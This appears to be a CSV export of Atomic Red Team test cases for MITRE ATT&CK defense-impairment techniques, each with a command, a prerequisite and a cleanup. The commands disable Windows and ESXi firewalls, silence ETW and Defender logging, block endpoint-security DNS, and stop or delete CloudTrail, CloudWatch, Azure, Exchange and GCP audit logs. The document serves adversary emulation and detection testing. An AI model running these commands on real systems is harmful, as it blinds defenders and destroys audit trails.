"TechniqueID","TestName","Command","PrereqCommand","CleanupCommand","SourceFile"
"T1562.004","Blackbit - Disable Windows Firewall using netsh firewall","netsh firewall set opmode mode=disable
","","netsh firewall set opmode mode=enable >nul 2>&1
","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
"T1562.004","ESXi - Disable Firewall via Esxcli","#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\..\atomics\T1562.004\src\esxi_disable_firewall.txt
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}""
","#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\..\atomics\T1562.004\src\esxi_enable_firewall.txt
","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
"T1562.004","Set a firewall rule using New-NetFirewallRule","New-NetFirewallRule -DisplayName ""New rule"" -Direction ""#{direction}"" -LocalPort ""#{local_port}"" -Protocol ""#{protocol}"" -Action ""#{action}""","","Remove-NetFirewallRule -DisplayName ""New rule""","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
"T1562.004","ESXi - Set Firewall to PASS Traffic","echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""esxcli network firewall set --default-action true""
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}""
","echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""esxcli network firewall set --default-action false""
","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
"T1562.006","Auditing Configuration Changes on Linux Host","sed -i '$ a #art_test_1562_006_1' /etc/audisp/#{audisp_config_file_name}
if [ -f ""/etc/#{auditd_config_file_name}"" ];
then sed -i '$ a #art_test_1562_006_1' /etc/#{auditd_config_file_name}
else sed -i '$ a #art_test_1562_006_1' /etc/audit/#{auditd_config_file_name}
fi 
sed -i '$ a #art_test_1562_006_1' /etc/#{libaudit_config_file_name}
","","sed -i '$ d' /etc/audisp/#{audisp_config_file_name}
if [ -f ""/etc/#{auditd_config_file_name}"" ];
then sed -i '$ d' /etc/#{auditd_config_file_name}
else sed -i '$ d' /etc/audit/#{auditd_config_file_name}
fi
sed -i '$ d' /etc/#{libaudit_config_file_name}
","C:\AtomicRedTeam\atomics\T1562.006\T1562.006.yaml"
"T1562.006","Auditing Configuration Changes on FreeBSD Host","echo '#art_test_1562_006_1' >> /etc/security/#{auditd_config_file_name}
","","sed -i """" '/#art_test_1562_006_1/d' /etc/security/#{auditd_config_file_name}
","C:\AtomicRedTeam\atomics\T1562.006\T1562.006.yaml"
"T1562.006","Logging Configuration Changes on Linux Host","if [ -f ""/etc/#{syslog_config_file_name}"" ];
then sed -i '$ a #art_test_1562_006_2' /etc/#{syslog_config_file_name}
fi
if [ -f ""/etc/#{rsyslog_config_file_name}"" ];
then sed -i '$ a #art_test_1562_006_2' /etc/#{rsyslog_config_file_name}
fi
if [ -f ""/etc/syslog-ng/#{syslog_ng_config_file_name}"" ];
then sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/#{syslog_ng_config_file_name}
fi
","","if [ -f ""/etc/#{syslog_config_file_name}"" ];
then sed -i '$ d' /etc/#{syslog_config_file_name}
fi
if [ -f ""/etc/#{rsyslog_config_file_name}"" ];
then sed -i '$ d' /etc/#{rsyslog_config_file_name}
fi
if [ -f ""/etc/syslog-ng/#{syslog_ng_config_file_name}"" ];
then sed -i '$ d' /etc/syslog-ng/#{syslog_ng_config_file_name}
fi
","C:\AtomicRedTeam\atomics\T1562.006\T1562.006.yaml"
"T1562.006","Logging Configuration Changes on FreeBSD Host","if [ -f ""/etc/#{syslog_config_file_name}"" ];
then echo '#art_test_1562_006_2' >> /etc/#{syslog_config_file_name}
fi
","","if [ -f ""/etc/#{syslog_config_file_name}"" ];
then sed -i """" '/#art_test_1562_006_2/d' /etc/#{syslog_config_file_name}
fi
","C:\AtomicRedTeam\atomics\T1562.006\T1562.006.yaml"
"T1562.006","Disable Powershell ETW Provider - Windows","cmd /c ""#{ps_exec_location}"" -accepteula -i -s cmd.exe /c logman update trace ""#{session}"" --p ""#{provider}"" -ets","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://download.sysinternals.com/files/PSTools.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\PStools.zip""
expand-archive -literalpath ""PathToAtomicsFolder\..\ExternalPayloads\PStools.zip"" -destinationpath ""PathToAtomicsFolder\..\ExternalPayloads\pstools"" -force","cmd /c ""#{ps_exec_location}"" -i -s cmd.exe /c logman update trace ""#{session}"" -p ""#{provider}"" -ets","C:\AtomicRedTeam\atomics\T1562.006\T1562.006.yaml"
"T1562.006","Disable .NET Event Tracing for Windows Via Registry (cmd)","REG ADD HKLM\Software\Microsoft\.NETFramework /v ETWEnabled /t REG_DWORD /d 0","","REG DELETE HKLM\Software\Microsoft\.NETFramework /v ETWEnabled /f > nul 2>&1","C:\AtomicRedTeam\atomics\T1562.006\T1562.006.yaml"
"T1562.006","Disable .NET Event Tracing for Windows Via Registry (powershell)","New-ItemProperty -Path HKLM:\Software\Microsoft\.NETFramework -Name ETWEnabled -Value 0 -PropertyType ""DWord"" -Force","","REG DELETE HKLM\Software\Microsoft\.NETFramework /v ETWEnabled /f > $null 2>&1","C:\AtomicRedTeam\atomics\T1562.006\T1562.006.yaml"
"T1562.006","LockBit Black - Disable the ETW Provider of Windows Defender -cmd","reg add ""HKLM\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational"" /v Enabled /t REG_DWORD /d 0 /f
","","reg delete ""HKLM\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational"" /v Enabled /f >nul 2>&1
","C:\AtomicRedTeam\atomics\T1562.006\T1562.006.yaml"
"T1562.006","LockBit Black - Disable the ETW Provider of Windows Defender -Powershell","New-ItemProperty ""HKLM:\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational"" -Name Enabled  -PropertyType DWord -Value 0 -Force
","","Remove-ItemProperty ""HKLM:\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational"" -Name Enabled -Force -ErrorAction Ignore
","C:\AtomicRedTeam\atomics\T1562.006\T1562.006.yaml"
"T1562.006","Disable .NET Event Tracing for Windows Via Environment Variable HKCU Registry - Cmd","REG ADD HKCU\Environment /v COMPlus_ETWEnabled /t REG_SZ /d 0 /f","","REG DELETE HKCU\Environment /v COMPlus_ETWEnabled /f > nul 2>&1","C:\AtomicRedTeam\atomics\T1562.006\T1562.006.yaml"
"T1562.006","Disable .NET Event Tracing for Windows Via Environment Variable HKCU Registry - PowerShell","New-ItemProperty -Path HKCU:\Environment -Name COMPlus_ETWEnabled -Value 0 -PropertyType ""String"" -Force","","Remove-ItemProperty -Path HKCU:\Environment -Name COMPlus_ETWEnabled","C:\AtomicRedTeam\atomics\T1562.006\T1562.006.yaml"
"T1562.006","Disable .NET Event Tracing for Windows Via Environment Variable HKLM Registry - Cmd","REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"" /v COMPlus_ETWEnabled /t REG_SZ /d 0 /f","","REG DELETE ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"" /v COMPlus_ETWEnabled /f > nul 2>&1","C:\AtomicRedTeam\atomics\T1562.006\T1562.006.yaml"
"T1562.006","Disable .NET Event Tracing for Windows Via Environment Variable HKLM Registry - PowerShell","New-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"" -Name COMPlus_ETWEnabled -Value 0 -PropertyType ""String"" -Force","","Remove-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"" -Name COMPlus_ETWEnabled","C:\AtomicRedTeam\atomics\T1562.006\T1562.006.yaml"
"T1562.006","Block Cybersecurity communication by leveraging Windows Name Resolution Policy Table","Add-DnsClientNrptRule -Namespace "".endpoint.security.microsoft.com"" -NameServers 127.0.0.1 -Comment ""Silenced by Name Resolution Policy Table""
Add-DnsClientNrptRule -Namespace ""endpoint.security.microsoft.com"" -NameServers 127.0.0.1 -Comment ""Silenced by Name Resolution Policy Table""
Clear-DnsClientCache","","try {
    # Get all current NRPT rules
        $DnsClientNrptRules = Get-DnsClientNrptRule | Where-Object { $_.Comment -eq 'Silenced by Name Resolution Policy Table' }
    
    # Remove each NRPT rule
        foreach ($rule in $DnsClientNrptRules) {
            Remove-DnsClientNrptRule -Name $rule.Name -Force
        }
    
    # Clear DNS client cache
    Clear-DnsClientCache
    Write-Host ""All NRPT rules have been removed and the DNS cache has been cleared.""
}

catch {
    Write-Host ""An error occurred: $_""
}
Clear-DnsClientCache","C:\AtomicRedTeam\atomics\T1562.006\T1562.006.yaml"
"T1562.008","AWS - CloudTrail Changes","aws cloudtrail update-trail --name #{cloudtrail_name} --s3-bucket-name #{s3_bucket_name}  --is-multi-region-trail --region #{region}
aws cloudtrail stop-logging --name #{cloudtrail_name} --region #{region}
aws cloudtrail delete-trail --name #{cloudtrail_name} --region #{region}
","echo Please install the aws-cli and configure your AWS default profile using: aws configure

---
echo Please install the terraform and configure your aws default profile 

---
cd ""$PathToAtomicsFolder/T1562.008/src/T1562.008-1/""
terraform init
terraform apply -auto-approve
","cd ""$PathToAtomicsFolder/T1562.008/src/T1562.008-1/""
terraform destroy -auto-approve
","C:\AtomicRedTeam\atomics\T1562.008\T1562.008.yaml"
"T1562.008","Azure - Eventhub Deletion","$secure_pwd = ""#{password}"" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $secure_pwd
Connect-AzureAD -Credential $creds
Remove-AzEventHub -ResourceGroupName #{resource_group} -Namespace #{name_space_name} -Name #{event_hub_name}
","Install-Module -Name AzureAD -Force

---
echo Please install the terraform.

---
echo Configure your Azure account using: az login. 

---
cd ""$PathToAtomicsFolder/T1562.008/src/T1562.008-2/""
terraform init
terraform apply -auto-approve
","cd ""$PathToAtomicsFolder/T1562.008/src/T1562.008-2/""
terraform destroy -auto-approve
","C:\AtomicRedTeam\atomics\T1562.008\T1562.008.yaml"
"T1562.008","Office 365 - Exchange Audit Log Disabled","$secure_pwd = ""#{password}"" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $secure_pwd
Connect-ExchangeOnline -Credential $creds
Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False
","Install-Module -Name ExchangeOnlineManagement         
Import-Module ExchangeOnlineManagement
","$secure_pwd = ""#{password}"" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $secure_pwd
Connect-ExchangeOnline -Credential $creds
Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $True
","C:\AtomicRedTeam\atomics\T1562.008\T1562.008.yaml"
"T1562.008","AWS - Disable CloudTrail Logging Through Event Selectors using Stratus","export AWS_REGION=#{aws_region} 
cd #{stratus_path}
echo ""starting warmup""
./stratus warmup aws.defense-evasion.cloudtrail-event-selectors
echo ""starting detonate""
./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force
","if [ ""$(uname)"" == ""Darwin"" ]
then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '""' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL
  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/
elif [ ""$(expr substr $(uname) 1 5)"" == ""Linux"" ]
then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '""' -f 4) 
  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL
  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/
fi

---
echo Please install the aws-cli and configure your AWS defult profile using: aws configure
","export AWS_REGION=#{aws_region}
echo ""Cleanup detonation""
cd #{stratus_path}
./stratus cleanup --all
rm -rf stratus*
","C:\AtomicRedTeam\atomics\T1562.008\T1562.008.yaml"
"T1562.008","AWS - CloudTrail Logs Impairment Through S3 Lifecycle Rule using Stratus","export AWS_REGION=#{aws_region} 
cd #{stratus_path}
echo ""starting warmup""
./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule
echo ""starting detonate""
./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force
","if [ ""$(uname)"" == ""Darwin"" ]
then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '""' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL
  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/
elif [ ""$(expr substr $(uname) 1 5)"" == ""Linux"" ]
then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '""' -f 4) 
  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL
  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/
fi

---
echo Please install the aws-cli and configure your AWS defult profile using: aws configure
","export AWS_REGION=#{aws_region}
echo ""Cleanup detonation""
cd #{stratus_path}
./stratus cleanup --all
rm -rf stratus*
","C:\AtomicRedTeam\atomics\T1562.008\T1562.008.yaml"
"T1562.008","AWS - Remove VPC Flow Logs using Stratus","export AWS_REGION=#{aws_region} 
cd #{stratus_path}
echo ""starting warmup""
./stratus warmup aws.defense-evasion.vpc-remove-flow-logs
echo ""starting detonate""
./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force
","if [ ""$(uname)"" == ""Darwin"" ]
then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '""' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL
  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/
elif [ ""$(expr substr $(uname) 1 5)"" == ""Linux"" ]
then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '""' -f 4) 
  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL
  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/
fi

---
echo Please install the aws-cli and configure your AWS defult profile using: aws configure
","export AWS_REGION=#{aws_region}
echo ""Cleanup detonation""
cd #{stratus_path}
./stratus cleanup --all
rm -rf stratus*
","C:\AtomicRedTeam\atomics\T1562.008\T1562.008.yaml"
"T1562.008","AWS - CloudWatch Log Group Deletes","aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json
echo ""*** Log Group Created ***""
aws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json
echo ""*** Log Group Deleted ***""
","echo Please install the aws-cli and configure your AWS defult profile using: aws configure
","","C:\AtomicRedTeam\atomics\T1562.008\T1562.008.yaml"
"T1562.008","AWS CloudWatch Log Stream Deletes","aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json
echo ""*** Log Group Created ***""
aws logs create-log-stream --log-group-name #{cloudwatch_log_group_name} --log-stream-name #{cloudwatch_log_stream_name} --region #{region}
echo ""*** Log Stream Created ***""
aws logs delete-log-stream --log-group-name #{cloudwatch_log_group_name} --log-stream-name #{cloudwatch_log_stream_name} --region #{region}
echo ""*** Log Stream Deleted ***""
aws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json
echo ""*** Log Group Deleted ***""
","echo Please install the aws-cli and configure your AWS defult profile using: aws configure
","","C:\AtomicRedTeam\atomics\T1562.008\T1562.008.yaml"
"T1562.008","Office 365 - Set Audit Bypass For a Mailbox","$secure_pwd = ""#{password}"" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $secure_pwd
Connect-ExchangeOnline -Credential $creds
Set-MailboxAuditBypassAssociation -Identity ""#{target_email}"" -AuditBypassEnabled $true
","Install-Module -Name ExchangeOnlineManagement         
Import-Module ExchangeOnlineManagement
","$secure_pwd = ""#{password}"" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $secure_pwd
Connect-ExchangeOnline -Credential $creds
Set-MailboxAuditBypassAssociation -Identity ""#{target_email}"" -AuditBypassEnabled $false
Disconnect-ExchangeOnline -Confirm:$false
","C:\AtomicRedTeam\atomics\T1562.008\T1562.008.yaml"
"T1562.008","GCP - Delete Activity Event Log","gcloud config set project #{project-id}
gcloud logging logs delete projects/#{project-id}/logs/cloudaudit.googleapis.com%2Factivity --quiet
","echo ""Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install""

---
gcloud auth login --no-launch-browser
","","C:\AtomicRedTeam\atomics\T1562.008\T1562.008.yaml"
"T1562.008","AWS - Config Logs Disabled","aws configservice stop-configuration-recorder --configuration-recorder-name #{configuration_recorder_name} --region #{region}
echo ""*** Configuration recorder stopped ***""
aws configservice delete-delivery-channel --delivery-channel-name #{delivery_channel_name} --region #{region}
echo ""*** Delivery channel deleted ***""
aws configservice delete-configuration-recorder --configuration-recorder-name #{configuration_recorder_name} --region #{region}
echo ""*** Configuration recorder deleted ***""
","echo Please install the aws-cli and configure your AWS default profile using: aws configure

---
echo Please install terraform and configure your AWS default profile
","aws configservice list-configuration-recorders --region us-west-2","C:\AtomicRedTeam\atomics\T1562.008\T1562.008.yaml"
